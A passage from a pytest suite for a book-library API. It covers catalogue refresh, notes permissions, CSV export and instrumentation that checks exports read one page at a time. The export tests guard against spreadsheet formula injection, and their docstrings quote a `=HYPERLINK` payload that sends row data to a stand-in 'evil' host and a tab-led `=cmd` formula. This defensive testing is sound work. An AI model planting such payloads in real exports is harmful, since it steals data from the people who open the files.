        """A cover the user uploaded outranks whatever Open Library offers."""
        book = make_book(admin["headers"], isbn="9780743273565")
        client.post(
            f"/api/books/{book['id']}/cover",
            files={"file": ("a.png", PNG_BYTES, "image/png")},
            headers=admin["headers"],
        )
        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
        assert res.json()["cover_url"] == f"/covers/{book['id']}.png"

    def test_the_local_cover_rule_is_covers_own(
        self, client, admin, make_book, monkeypatch, open_library_hit
    ):
        """Behavioural, because a grep is satisfied by the defect it replaced.

        This handler is the second writer of that rule and had only the arm
        above, which passes, and goes on passing, for a copy of the literal: the
        two answers diverge only once the prefix moves. `covers.is_local` reads
        `LOCAL_COVER_PREFIX` at call time, so moving it here moves this handler
        with it, and a copy answers for the old prefix and overrules an upload.

        **It is what closes the one evasion the structural guard cannot see.**
        `test_covers.py::TestNoOtherModuleDecidesWhetherACoverIsLocal` refuses
        the constant read and the literal spelled again; a prefix **assembled**,
        `startswith("/cover" + "s/")`, walks past it and fails here.
        `test_google_books.py::TestMergeInto::test_the_local_cover_rule_is_covers_own`
        is the same arm at the first writer.
        """
        monkeypatch.setattr(covers, "LOCAL_COVER_PREFIX", "/held/")
        book = make_book(admin["headers"], isbn="9780743273565", cover_url="/held/1.png")

        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])

        assert res.json()["cover_url"] == "/held/1.png"

    def test_replaces_a_remote_cover(self, client, admin, make_book, open_library_hit):
        book = make_book(
            admin["headers"], isbn="9780743273565", cover_url="https://example.com/old.jpg"
        )
        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
        assert res.json()["cover_url"].startswith("https://covers.openlibrary.org/")

    def test_a_book_without_an_isbn_is_400(self, client, admin, make_book):
        book = make_book(admin["headers"])
        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])
        assert res.status_code == 400

    def test_a_book_no_catalogue_holds_is_404_and_keeps_what_it_had(
        self, client, admin, make_book, open_library_miss
    ):
        book = make_book(admin["headers"], title="Typed by hand", isbn="9780743273565")

        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])

        assert res.status_code == 404
        after = client.get(f"/api/books/{book['id']}", headers=admin["headers"]).json()
        assert after["title"] == "Typed by hand"

    def test_a_catalogue_that_cannot_be_reached_is_503_and_keeps_what_it_had(
        self, client, admin, make_book
    ):
        """Not 404: that tells the member to type the book in by hand, when the
        honest answer is to try again."""
        book = make_book(admin["headers"], title="Typed by hand", isbn="9780743273565")
        with respx.mock(assert_all_called=False) as mock:
            mock.get(url__startswith=DNB).mock(return_value=_sru_empty())
            mock.get(url__startswith=K10PLUS).mock(return_value=_sru_empty())
            silence_sru_catalogues(mock)
            mock.get(url__startswith="https://openlibrary.org/").mock(
                return_value=httpx.Response(503)
            )
            silence_covers(mock)
            res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])

        assert res.status_code == 503
        assert "Could not reach the book catalogues" in res.json()["detail"]
        after = client.get(f"/api/books/{book['id']}", headers=admin["headers"]).json()
        assert after["title"] == "Typed by hand"

    def test_unknown_book_is_404(self, client, admin):
        assert client.put("/api/books/9999/refresh", headers=admin["headers"]).status_code == 404

    def test_a_value_no_column_can_hold_costs_that_field_and_not_the_refresh(
        self, client, admin, make_book, open_library_oversized
    ):
        """The ticket, end to end. Nine columns are written straight off the
        record here and eight had no ceiling in the schema, in the model or in
        SQLite, which does not enforce a `VARCHAR` length."""
        book = make_book(admin["headers"], title="Stale", isbn="9780743273565")

        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])

        assert res.status_code == 200
        body = res.json()
        assert body["subtitle"] is None
        assert body["publisher"] is None
        assert body["description"] is None
        assert body["page_count"] is None

    def test_a_title_the_column_cannot_hold_leaves_the_stored_one_alone(
        self, client, admin, make_book, open_library_oversized
    ):
        """`title` is the Book's one `NOT NULL` text column, and the handler
        writes `record.title or book.title`, so an unusable title costs nothing
        rather than emptying the row."""
        book = make_book(admin["headers"], title="Stale", isbn="9780743273565")

        res = client.put(f"/api/books/{book['id']}/refresh", headers=admin["headers"])

        assert res.json()["title"] == "Stale"

    def test_nothing_the_refresh_stores_is_wider_than_its_column(
        self, client, admin, make_book, open_library_oversized
    ):
        """Asserted over the whole ceiling table rather than over the fields
        this fixture happens to oversize, so a column added to it is covered
        without this test being edited."""
        book = make_book(admin["headers"], title="Stale", isbn="9780743273565")

        body = client.put(
            f"/api/books/{book['id']}/refresh", headers=admin["headers"]
        ).json()

        too_wide = {
            name: len(body[name])
            for name, ceiling in catalogue._TEXT_CEILINGS.items()
            if isinstance(body.get(name), str) and len(body[name]) > ceiling
        }
        assert too_wide == {}


class TestNotes:
    def test_adding_a_note(self, client, admin, make_book):
        book = make_book(admin["headers"])
        res = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "Loved it"}, headers=admin["headers"]
        )
        assert res.status_code == 201
        assert res.json()["content"] == "Loved it"

    def test_a_note_carries_its_author(self, client, member, make_book):
        book = make_book(member["headers"])
        res = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "Mine"}, headers=member["headers"]
        )
        assert res.json()["author"]["username"] == "member"

    def test_notes_are_listed_oldest_first(self, client, admin, make_book):
        book = make_book(admin["headers"])
        for content in ("first", "second"):
            client.post(
                f"/api/books/{book['id']}/notes",
                json={"content": content},
                headers=admin["headers"],
            )
        listed = client.get(f"/api/books/{book['id']}/notes", headers=admin["headers"]).json()
        assert [n["content"] for n in listed] == ["first", "second"]

    def test_author_can_edit_their_note(self, client, admin, make_book):
        book = make_book(admin["headers"])
        note = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "v1"}, headers=admin["headers"]
        ).json()
        res = client.put(
            f"/api/books/{book['id']}/notes/{note['id']}",
            json={"content": "v2"},
            headers=admin["headers"],
        )
        assert res.json()["content"] == "v2"

    def test_another_user_cannot_edit_it(self, client, admin, member, make_book):
        book = make_book(admin["headers"])
        note = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "v1"}, headers=admin["headers"]
        ).json()
        res = client.put(
            f"/api/books/{book['id']}/notes/{note['id']}",
            json={"content": "hijacked"},
            headers=member["headers"],
        )
        assert res.status_code == 403

    def test_an_admin_may_delete_anyone_s_note(self, client, admin, member, make_book):
        book = make_book(member["headers"])
        note = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "theirs"}, headers=member["headers"]
        ).json()
        res = client.delete(
            f"/api/books/{book['id']}/notes/{note['id']}", headers=admin["headers"]
        )
        assert res.status_code == 204

    def test_an_admin_may_edit_someone_else_s_note(self, client, admin, member, make_book):
        """Documents the current rule: admin overrides the author check on edit
        too. It stops at a note's visibility, which
        `tests/routers/test_books_notes.py` pins from the other side."""
        book = make_book(member["headers"])
        note = client.post(
            f"/api/books/{book['id']}/notes", json={"content": "theirs"}, headers=member["headers"]
        ).json()
        res = client.put(
            f"/api/books/{book['id']}/notes/{note['id']}",
            json={"content": "rewritten"},
            headers=admin["headers"],
        )
        assert res.status_code == 200

    def test_a_note_id_from_another_book_is_404(self, client, admin, make_book):
        book_a = make_book(admin["headers"], title="A")
        book_b = make_book(admin["headers"], title="B")
        note = client.post(
            f"/api/books/{book_a['id']}/notes", json={"content": "x"}, headers=admin["headers"]
        ).json()
        res = client.delete(
            f"/api/books/{book_b['id']}/notes/{note['id']}", headers=admin["headers"]
        )
        assert res.status_code == 404

    def test_notes_on_an_unknown_book_are_404(self, client, admin):
        assert client.get("/api/books/9999/notes", headers=admin["headers"]).status_code == 404


class TestExport:
    def _rows(self, response) -> list[dict]:
        return list(csv.DictReader(io.StringIO(response.text)))

    def test_a_format_outside_its_enum_never_reaches_the_export(self, client, admin):
        """A `format` outside its enum is refused at the write, and that stays
        worth pinning now the export escapes every cell anyway: the refusal is
        what keeps the column meaning something, and it is the arm that goes
        red if the enum validator is dropped from the payload."""
        res = client.post(
            "/api/books",
            json={"title": "Test Book", "author": "Test Author", "format": "=1+1"},
            headers=admin["headers"],
        )
        assert res.status_code == 422

    def test_csv_contains_the_books(self, client, admin, make_book):
        make_book(admin["headers"], title="Exported", author="An Author")
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert rows[0]["Title"] == "Exported"
        assert rows[0]["Added By"] == "admin"

    def test_csv_includes_the_reader_s_own_status(self, client, admin, make_book):
        book = make_book(admin["headers"])
        client.put(
            f"/api/books/{book['id']}/status", json={"status": "read"}, headers=admin["headers"]
        )
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert rows[0]["My Status"] == "read"

    def test_csv_quotes_a_title_containing_a_comma(self, client, admin, make_book):
        make_book(admin["headers"], title="Eats, Shoots & Leaves")
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert rows[0]["Title"] == "Eats, Shoots & Leaves"

    def test_txt_format_is_served_as_plain_text(self, client, admin, make_book):
        make_book(admin["headers"], title="Exported")
        res = client.get(
            "/api/books/export", params={"format": "txt"}, headers=admin["headers"]
        )
        assert "text/plain" in res.headers["content-type"]
        assert "Title: Exported" in res.text

    def test_response_is_an_attachment(self, client, admin, make_book):
        make_book(admin["headers"])
        res = client.get("/api/books/export", headers=admin["headers"])
        assert res.headers["content-disposition"].startswith("attachment;")
        assert ".csv" in res.headers["content-disposition"]

    def test_an_unknown_format_is_rejected(self, client, admin):
        res = client.get(
            "/api/books/export", params={"format": "pdf"}, headers=admin["headers"]
        )
        assert res.status_code == 422

    def test_export_excludes_other_users_private_books(self, client, admin, member, make_book):
        make_book(admin["headers"], title="Secret", is_private=True)
        make_book(admin["headers"], title="Public")
        rows = self._rows(client.get("/api/books/export", headers=member["headers"]))
        assert [r["Title"] for r in rows] == ["Public"]

    def test_export_includes_the_reader_s_own_private_books(self, client, admin, make_book):
        make_book(admin["headers"], title="Secret", is_private=True)
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert [r["Title"] for r in rows] == ["Secret"]

    def test_requires_authentication(self, client):
        assert client.get("/api/books/export").status_code == 401

    def test_the_leads_are_exactly_the_six_a_spreadsheet_acts_on(self):
        """**The arm below is parametrised off this very tuple**, so dropping
        an entry drops an arm and the suite stays green. Measured: reducing it
        to `("=",)` was caught by nothing in the tree.

        Four are the characters Excel and LibreOffice read as the start of a
        formula. Tab and carriage return are the two that read like padding and
        are not: both are stripped before the cell is parsed, so `"\\t=cmd|..."`
        runs. Nothing else in the tree pins this, and `_csv_safe`'s docstring
        carries the argument.
        """
        assert books_router._FORMULA_LEAD == ("=", "+", "-", "@", "\t", "\r")

    @pytest.mark.parametrize("lead", books_router._FORMULA_LEAD)
    def test_every_lead_a_spreadsheet_would_run_is_neutralised(
        self, client, admin, make_book, lead
    ):
        """Driven off `_FORMULA_LEAD` itself, so a character added to it is
        covered by construction.

        Every other escape assertion in this tree uses `=`, so deleting the
        other five entries passed the whole suite. Tab and carriage return are
        the two that read like padding and are not: Excel strips them and then
        runs whatever follows, so `"\\t=cmd|..."` executes.
        """
        make_book(admin["headers"], title=f"{lead}=1+1")
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert rows[0]["Title"] == f"'{lead}=1+1"

    def test_a_currency_that_is_a_formula_reaches_the_file_as_text(
        self, client, admin, make_book
    ):
        """`Purchase Currency` looks like the enum columns beside it and is not.

        Its validator asks for three characters and upper cases them, which
        `=A1` answers, so nothing between the payload and the file refuses a
        formula. The payload the escape exists for is
        `=HYPERLINK("http://evil/?d="&A1,"ok")`, which exfiltrates the row when
        an admin opens the export.
        """
        book = make_book(admin["headers"])
        client.patch(
            f"/api/books/{book['id']}",
            json={"purchase_currency": "=A1"},
            headers=admin["headers"],
        )
        rows = self._rows(client.get("/api/books/export", headers=admin["headers"]))
        assert rows[0]["Purchase Currency"] == "'=A1"


def _underlying(member: object) -> object | None:
    """The function inside a member, whatever descriptor is wrapping it.

    `__func__` reaches a `classmethod` or a `staticmethod`, `fget` a
    `property`, `func` a `cached_property`. A member none of those reach and
    that is not itself a function cannot be classified here, and that residual
    is the one gap `_watched_members` cannot state as a refusal.
    """
    for attribute in ("__func__", "fget", "func"):
        inner = getattr(member, attribute, None)
        if inner is not None:
            return inner
    return member if inspect.isfunction(member) else None


def _watched_members(
    owner: type, matches, subject: str, *, refuse_descriptors: bool
) -> list[str]:
    """Every plain function on `owner` that hands back `matches`, and a refusal.

    **Derived from each member's declared return type rather than from a list
    of names**, so a member of `vars(owner)` that starts declaring `matches`
    is watched or refused without this file being edited. **That is the whole
    of the claim, and it is narrower than it reads**: two callers with two
    matchers of different strength lean on this one sentence, and what each
    reaches is its own matcher over its own class body. Neither half is
    general, and each caller states where its own stops.

    **`vars(owner)` is the class's own body, so an inherited member is
    neither watched nor refused.** A door moved onto a base class or a mixin
    leaves this derivation matching nothing, which brings the class down on
    the emptiness rather than naming the member: that is the same exclusion
    `_is_a_query` records one level out for a door written at module level,
    and it is why the refusal below is an exclusion over a class body rather
    than over everything that declares the subject.

    **The refusal is the door derivation's and no longer the resolver's**,
    which is a narrowing bought by the row counter beside this class. It
    states the exclusion rather than an inclusion: anything in the class's
    own body that declares `subject` and is not being watched fails by name. Naming the descriptor
    kinds instead failed in both directions, measured: a refusal keyed on
    `classmethod | staticmethod` let a `property` resolver through silently,
    because a property is neither, and it brought the whole class down on a
    pure `staticmethod` helper that resolves nothing.

    **Why the resolvers no longer need it and the doors still do.** The
    refusal insures against a member the recorder cannot wrap. A resolver it
    cannot wrap still puts its rows across the driver, so
    `test_the_rows_behind_an_arm_do_not_grow_with_the_shelf` sees it whatever
    descriptor it is in. A door hands back a query that **has resolved
    nothing**, so there is no row for any driver to count and the only thing
    keeping an unwrappable door from being silently unwatched is this
    refusal. "With the driver counting there is nothing left to wrap" is true
    of rows and false of intentions.

    **A member handed `subject` in its parameters is permitted, and the
    permission is exactly as wide as the matcher.** The parameter check reuses
    the return matcher, so what goes free here is a member handed the same
    thing it hands back: for the door derivation, a query to narrow, which is
    what `test_the_derivation_permits_a_door_handed_the_query_it_narrows`
    drives and what that name says. The ground is that such a member narrows
    something its caller resolves at the caller's own site, watched there.

    **A door handed rows the caller has already resolved is refused by the
    same check**, because `list[Book]` is not what the door's matcher reads.
    That refusal is not what the paragraph above defends: those rows were
    resolved by something watched too. It stands because widening the check
    to a second matcher would put a resolver's annotation inside the door
    derivation, and no member of `Shelf` has that shape. Named here rather
    than covered.

    **`refuse_descriptors` is keyword only and carries no default**, because
    the value a default would carry is the one that refuses nothing. A third
    caller added later would inherit it in silence, which is the failure the
    refusal exists to prevent, and a keyword makes the choice visible at each
    call instead.

    **What being watched does not bound.** What is recorded is what a member
    hands back, so a member that resolves the shelf internally and returns a
    page is outside every reading here whether it is watched or not: the
    recorder wraps it, logs the page, and the rows behind it were never
    counted. Measured on this tree, baseline 232 passed, one concept each: a
    helper that builds a title index from the whole table and returns a page
    passed at 232 as a `staticmethod` taking rows **and** at 232 as a plain
    instance method reading `self._query.all()`. Both sit in `shelf.py`, so
    rule 2 does not see them, and both leave the file byte identical, so the
    title arm does not either. **That is the hole the row counter was added
    for**, and it is the one reading in this class that watches the database
    rather than the Python surface.
    """

    def declares(fn: object, where: str) -> bool:
        hints = typing.get_type_hints(fn)
        if where == "return":
            return matches(hints.get("return"))
        return any(matches(hint) for name, hint in hints.items() if name != "return")

    watched: list[str] = []
    refused: list[str] = []
    for name, member in vars(owner).items():
        function = _underlying(member)
        if function is None or not declares(function, "return"):
            continue
        if inspect.isfunction(member):
            watched.append(name)
        elif refuse_descriptors and not declares(function, "parameter"):
            refused.append(name)

    assert refused == [], (
        f"{owner.__name__}.{refused} hand back {subject} and are not plain "
        "functions, so the recorder cannot wrap them and would watch less "
        "than it claims. Make one a plain method, or teach the fixture the "
        "descriptor it is wrapped in."
    )
    assert watched, (
        f"nothing in {owner.__name__}'s own body declares {subject}, so this "
        "derivation matched nothing and every arm reading it would pass on an "
        "empty list. Two shapes arrive here as an absence rather than as a "
        "refusal, and this message is the only place either is visible: a "
        "member declaring the subject in a form this matcher does not walk "
        "into, a union being the one already met, and a member inherited from "
        "a base class or a mixin, which `vars(owner)` does not see at all."
    )
    return watched


#: Stands in for a resolver annotated through an alias, so the arm below can
#: drive `_through_aliases` against the spelling the backend actually writes
#: (a module level `type` statement, as `folding.py` and `sru.py` write it).
#: Nothing on `Shelf` is annotated this way today.
type _RowsBehindAnAlias = list[Book]

#: The sibling spelling, as `importing.py` writes one. Beside the alias
#: rather than in place of it: the two reach the matcher by different
#: attributes and a probe over one says nothing about the other.
_RowsBehindANewType = typing.NewType("_RowsBehindANewType", list[Book])


def _through_aliases(annotation: object) -> object:
    """A `type` alias resolved to what it stands for, however deep.

    **An alias object carries no type arguments**, so a matcher walking
    `get_args` reads `type Rows = list[Book]` as declaring nothing at all and
    the member holding it leaves the population in silence: not watched, and
    not refused either, because the refusal is derived from the same matcher.
    The backend writes that spelling at module level in three modules, none
    of them `shelf.py`, so this closes a shape the house already uses rather
    than one somebody might invent.

    **`NewType` is the same idea in the other spelling and the backend writes
    it too**, in the importing module. It carries its target on
    `__supertype__` and returns nothing from a walk of type arguments, so a
    resolver behind one reads as the same silent absence. Closing one
    spelling and leaving its sibling is the shape this repository keeps
    paying for, and the correction is where the next error hides.
    """
    while True:
        if isinstance(annotation, typing.TypeAliasType):
            annotation = annotation.__value__
        elif isinstance(annotation, typing.NewType):
            annotation = annotation.__supertype__
        else:
            return annotation


def _holds_book_rows(annotation: object) -> bool:
    """Whether an annotation reaches a `Book` row.

    Structural rather than textual: `get_args` walks the type the annotation
    evaluates to, so `list[Book]` and `tuple[list[Book], int]` both answer
    yes and no spelling of either can hide from it.

    **It walks type arguments and never a wrapper's fields**, which is what
    leaves `Shelf.outbound_page` and `outbound_first` outside the population:
    `Outbound` holds its Books in a field and has no arguments to walk, so
    the two are neither watched nor refused. **What covers them is delegation
    rather than reach.** Both call `page` and `first`, which are watched, so
    the channel records their rows whoever asked: measured under the recorder
    at seven and one. Reachability is an argument about the callers of the
    day; delegation is a property of the two members.

    **The residue is that nothing pins the delegation.** If either body
    stopped calling a watched member and resolved its rows itself, the
    channel would go blind and nothing here would be red.
    """
    annotation = _through_aliases(annotation)
    if annotation is Book:
        return True
    return any(_holds_book_rows(arg) for arg in typing.get_args(annotation))


def _is_a_query(annotation: object) -> bool:
    """A member handing back a query the caller will run itself.

    It matters because rows resolved at the caller are resolved outside
    anything wrapping the shelf, so a full pass taken this way is invisible to
    every count in the class below.

    **Matches the bare and the subscripted form and stops there**, which is
    narrower than `_holds_book_rows` beside it: that one walks into a wrapping
    type and this one does not, so a door annotated as a union is neither
    watched nor refused and lands as a derivation that matched nothing. The
    refusal in `_watched_members` says to look at the matcher first for that
    reason.

    **Found by the return type rather than by the name**, so a second door
    added to `Shelf` is watched without this line being edited. **A second
    door outside `Shelf` is not**, and one already exists:
    `shelf.whole_table_for_uniqueness` is a module level function returning
    the same type, deliberately blind to the viewer, to private rows and to
    trashed rows. `_watched_members` reads `vars(owner)`, so it cannot see it
    and does not refuse it either. What keeps that door from quietly becoming
    an export's is not this file but
    `tests/test_shelf.py::test_the_named_ways_past_a_viewer_have_the_callers_they_claim`,
    which pins its callers and makes a fifth a decision rather than an edit.

    **A `type` alias is resolved before either test**, for the reason
    `_through_aliases` carries: an alias reaches neither form otherwise and
    arrives as a door that is not there.
    """
    annotation = _through_aliases(annotation)
    return annotation is Query or typing.get_origin(annotation) is Query


#: Every container `_books_in` opens on its way to a `Book`. One object
#: rather than two spellings, because `_opens` falls back to reading it when
#: it cannot build a container to ask the walk directly: a walk that opened
#: something this tuple leaves out would then be judged by the wrong set.
_WALKED_CONTAINERS: typing.Final = (dict, list, tuple, set, frozenset)


def _books_in(value: object) -> int:
    """How many `Book` rows a member handed back, whatever it wrapped them in.

    **A container this does not open reads as zero, which is the number an
    unwatched member also reads as**, so how far this walks is a property of
    the channel rather than a detail of it. Measured: a resolver returning
    `dict[int, Book]` over the whole table was counted as no books at all,
    every arm over this channel stayed green, and only the row counter fired.
    `test_every_watched_resolver_hands_back_a_container_this_channel_opens`
    is what keeps the walk and the annotations together.

    A `dict` is opened on **both** halves: a resolver keyed by Book is as real
    a shape as one valued by it, and walking one half is the same blind spot
    one level in.
    """
    if isinstance(value, Book):
        return 1
    if isinstance(value, dict):
        value = [*value.keys(), *value.values()]
    if isinstance(value, _WALKED_CONTAINERS):
        return sum(_books_in(item) for item in value)
    return 0


def _opens(container: type) -> bool:
    """Whether `_books_in` walks into a container of this kind.

    **The walk's own test, read one level up rather than spelled a second
    time.** The walk resolves a Book, flattens a mapping through a branch of
    its own, and then asks whether what it is holding is one of
    `_WALKED_CONTAINERS`. So a container it opens is necessarily a subclass
    of that tuple, and this is the same membership asked of the class.

    **That sentence establishes the direction this does not use, and the
    converse is weaker.** What is answered here is the class's membership,
    which the walk **requires** and does not by itself grant: a subclass
    keeping its rows somewhere the walk does not look, and one that is
    itself a row and so taken by the first branch before the membership is
    ever reached, both answer yes here and count zero, and nothing in the
    arm catches either. **Left open deliberately.** An instance of it is a
    container that does not hold its items where it says it does, or a row
    that is also a container, and neither can be built against these models;
    the construction this replaced was wrong on three ordinary shapes and
    took the arm out with a traceback on one of them. Iterating a guard past
    an honest residue is a failure this repository has already paid for.

    **Building one and asking the walk what it found was tried and dropped,
    and the reason is that it answered about the constructor.** Wherever a
    constructor is not faithful the two disagree and the construction is
    wrong: a `list` subclass whose init filters and a mapping whose init
    discards or re-keys what it is handed are all opened by the walk and
    refused by a probe, which is the same false refusal the probe was last
    changed to remove, one convention further in. Worse, a constructor that
    rejects the probe's argument by any route other than `TypeError` took
    this arm out with a traceback naming neither the member nor the
    container, so guarding on one exception type was an enumeration of one
    failure mode. **The construction could never add a yes in the first
    place**, only agree or be wrong, which is what makes dropping it free.

    **An abstract container is a subclass of nothing walked, so it answers
    no here too, and that is not why the arm refuses it.** It is turned away
    on its own ground, before this is asked, because "teach the walk this
    container" is not something anybody can carry out for a protocol.

    **What the probe was worth was its refusal to take the walk on trust,
    and that is kept at the arm rather than here.** This cannot tell a walk
    that stopped counting from one that never opened anything, so the arm
    drives the walk directly on a list and on a mapping.
    """
    return issubclass(container, _WALKED_CONTAINERS)


def _containers_holding_book_rows(annotation: object) -> set[type]:
    """Every container on a path from `annotation` to a `Book`.

    **A union is not a container.** `Book | None` arrives at the walk as a
    Book or as a None, both of which it already reads, so nothing has to be
    opened to reach the row and nothing is collected here.

    **Nor is a query**, and that is `_is_a_query`'s judgement rather than a
    second one written here: a query has resolved nothing, so it holds no
    rows to walk and the door channel is what watches it.
    """
    if _is_a_query(annotation):
        return set()
    annotation = _through_aliases(annotation)
    found: set[type] = set()
    origin = typing.get_origin(annotation)
    args = typing.get_args(annotation)
    if (
        isinstance(origin, type)
        and origin not in (types.UnionType, typing.Union)
        and any(_holds_book_rows(arg) for arg in args)
    ):
        found.add(origin)
    for arg in args:
        found |= _containers_holding_book_rows(arg)
    return found


def _shelf_resolvers() -> list[str]:
    return _watched_members(Shelf, _holds_book_rows, "Book rows", refuse_descriptors=False)


def _shelf_query_doors() -> list[str]:
    # The one caller that still refuses a descriptor it cannot wrap, because
    # a door resolves no rows and the row counter has nothing to see.
    return _watched_members(
        Shelf, _is_a_query, "an unresolved query", refuse_descriptors=True
    )


def _named(key: tuple[type | None, bool]) -> str:
    """One `peak_rows` key as a failure message reads it.

    The relationship half is spelled rather than shown as a bool: a message
    reading `(Tag, True)` is one the reader has to go and look up while a
    test is red, and `Tag, behind a page` says why that load is allowed to be
    larger than the page.
    """
    entity, related = key
    return f"{entity.__name__ if entity is not None else 'unattributed'}, " + (
        "behind a page" if related else "primary"
    )


class _Resolved:
    """What one request resolved, by channel.

    Two channels rather than one, because each is a way the peak can grow
    that the other cannot see: Books through the shelf, and a query handed to
    the caller to run.

    **`books` rather than `rows`, and the name is the finding rather than
    the taste.** `Statement.rows` beside this holds what the driver handed
    over and this holds what a member handed back, and the whole worth of
    the second instrument is that the two numbers come apart. One word for
    both is how a reading gets quoted against the wrong question.

    **This counts entities and the row counter beside it counts rows, and
    neither replaces the other.** The rows are what crossed the driver, before
    the ORM folds a joined result back into entities; these are what a member
    handed back, after. A page that comes back short is right in the first
    number and wrong in the second, which is why the reading records channel
    could be retired into the row counter and this one could not.

    The third channel, `Reading`'s loaded records, was retired here: it was
    keyed on `Records` by identity, so a loader handing back a plain list of
    rows was neither watched nor refused, and the row counter reads the same
    load off the driver keyed on the mapper, which no annotation can dodge.
    """

    def __init__(self) -> None:
        self.books: list[int] = []
        self.queries: list[str] = []


class TestNoExportArmResolvesMoreBooksThanAPage:
    """The export route holds one page of rows, whatever format was asked for.

    Every arm used to resolve the whole shelf. The MARCXML arm was paged
    first, and the CSV and txt arms beside it were not: they are reachable by
    any authenticated member where MARCXML is gated by library mode, and the
    CSV arm carries the description column, so they were the worse two.

    **The arms come from `ExportFormat` rather than from a list written here**,
    so a format added to that enum arrives already under this rule and a
    format that forgets to page fails on the day it is written.

    **Five readings, and none substitutes for another:**

    | reading | the shape only it catches |
    |---|---|
    | Books resolved at once | a lazy walk that resolves the shelf and slices it |
    | the body's generator state | a route that joins the pages into one string |
    | the body's piece count | a generator that accumulates and yields once |
    | rows one statement handed over | a member resolving the table internally and returning a page |
    | rows of a paged entity in one statement | a load constant in the shelf and larger than a page |

    **The first reading's reach is the containers its walk opens**, which is
    a property of the channel rather than of any arm over it, and
    `test_every_watched_resolver_hands_back_a_container_this_channel_opens`
    is what keeps it as wide as the resolvers' annotations.

    **Each of the five was shown to be load bearing by a mutant the other
    four pass.** The fifth's is a statuses batch over a rolling two page
    window, constant in the shelf and larger than a page: measured, it
    reddens this class's ceiling and nothing else, the growth reading passing
    it by construction because a constant cancels between two shelf sizes.
    The fifth also puts back a bound the retired reading records channel held
    and the reading that replaced it dropped.

    **The fifth's diagonal is the counter's rather than the ceiling's.**
    `test_the_row_counter_sees_a_reading_load_hoisted_off_the_page` drives
    `Reading` directly and never the route, so it stays green on the mutant
    above and green again on a second hoisting written inside the route where
    both other readings redden. What it shows is that the counter reads a
    `UserBook` load at all; nothing here drives the ceiling's own boundary,
    and that is a hole rather than a narrowing.

    **The last two watch the database and the first three watch Python.** The
    database readings need no name, no descriptor and no annotation: whatever
    issued the statement, the rows crossed the driver. That is what closes
    the hole `_watched_members` states, where a member resolves the whole
    table inside itself and hands back a page.

    **And the fourth is not a row bound.** A page legitimately drags a
    collection behind it, so that reading is relative, keyed on the
    `(entity, relationship)` pair and asking that no load grow with the
    shelf. The fifth is the absolute half, and it is narrow to the two
    entities an export reads once a page for the reason stated at it. What
    each accepts is stated at its own arm.

    **What still walks past all five**, measured twice on two seats'
    harnesses: hoisting `Shelf.seen_by` above the loop and reusing the
    object. It re-executes the same statement per page, so its row profile is
    identical to a correct walk and the driver has nothing to report. See
    `test_a_book_made_private_ahead_of_the_walk_is_in_no_page`, which is the
    arm that shape was measured against.

    **A second resolution beside a correct walk is why the channels are
    counted rather than the walk being watched.** A full pass added next to an
    intact walk passed every reading this class had before it counted the
    query door and the reading records, and the pull towards writing one is
    real: this file is in catalogued order now, and one full pass is the
    cheapest way to put title order back.
    """

    #: A page a test can build a shelf around, patched rather than reached:
    #: what is under test is that there is a page boundary, not the number.
    #: `marc.EXPORT_PAGE_RECORDS` is the one knob every arm reads.
    PAGE = 3

    #: Two full pages and one short one, so a walk that stops early, repeats a
    #: page or never starts writes a different file.
    BOOKS = PAGE * 2 + 1

    #: The entities an export reads once a page and never in bulk, which is
    #: what makes an absolute ceiling writable over them at all. Everything
    #: else the request loads is legitimately larger than a page, an auth
    #: lookup or a reference table, and that is why the reading beside the
    #: ceiling is relative rather than absolute.
    PAGED = (Book, UserBook)

    @pytest.fixture
    def small_pages(self, monkeypatch):
        monkeypatch.setattr(marc, "EXPORT_PAGE_RECORDS", self.PAGE)
        return self.PAGE

    @pytest.fixture
    def resolved(self, monkeypatch) -> _Resolved:
        """The two Python level channels, wrapped for one test.

        The fourth reading is not here: it watches the driver, so it needs
        nothing wrapped and is armed at its own arm.
        """
        seen = _Resolved()

        def record(owner, names, measure):
            for name in names:
                original = getattr(owner, name)

                def watched(self, *args, _original=original, _measure=measure, **kwargs):
                    result = _original(self, *args, **kwargs)
                    _measure(result)
                    return result

                monkeypatch.setattr(owner, name, watched)

        record(Shelf, _shelf_resolvers(), lambda rows: seen.books.append(_books_in(rows)))
        # The name rather than the size: a query handed to the caller has
        # resolved nothing yet, so there is no number to take here and what
        # matters is that an export took this door at all.
        for door in _shelf_query_doors():
            record(Shelf, [door], lambda _query, _door=door: seen.queries.append(_door))
        return seen

    def a_shelf(self, db, owner, count: int, titled: str = "Book") -> None:
        """`count` public books this owner has read, titled out of id order.

        Descending titles over ascending ids, so the fixture cannot
        accidentally agree with the walk's key.

        **Every book carries a reading row**, which is not decoration: without
        them `Reading.everything()` loads nothing and a batch hoisted off the
        page reads as bounded. With them it loads the whole shelf and the
        arms below see it.

        **The reading rows go on the books this call added, and `titled`
        exists for the same reason**: one arm grows the shelf by calling this
        twice. Attaching them by re-reading the table instead would collide
        on the second call, since a member may hold one reading row per book,
        and it made the fixture itself resolve the whole table.

        **Every table the export reads is grown by this call, and without
        that the growth comparison beside it watches with no signal.** A load
        lifted onto a whole table only grows if the table does: with no tags
        and no classifications here, `Tag` and `Classification` read zero rows
        at both shelf sizes, and a whole table read of either planted inside
        an export arm passed. So each call brings its own collection, a tag a
        book and a classification a book. The CSV arm reads the tags and the
        collection, the MARCXML arm reads the tags and the classifications.

        **`users` grows too, through a member who owns no books**, and the
        reason it was left out was wrong rather than expensive. Growing that
        table does not bring a second member's books with it: a row is
        enough, and a member with an empty shelf changes nothing any arm
        here reads. Left constant, a whole table read of `users` planted
